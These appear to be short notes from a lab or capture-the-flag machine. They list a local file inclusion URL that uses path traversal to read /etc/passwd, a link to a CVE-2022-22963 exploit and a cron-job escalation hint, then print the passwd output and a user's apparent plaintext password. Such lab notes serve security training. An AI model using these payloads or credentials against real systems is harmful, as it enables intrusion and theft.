## Main points
- Local File Inclusion: http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd
- https://github.com/darryk10/CVE-2022-22963
- Full path of the binary that runs as a **cron job** and executes all the `.yml` files located in the `/opt/automation/tasks/` 


```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

phil
DocPhillovestoInject123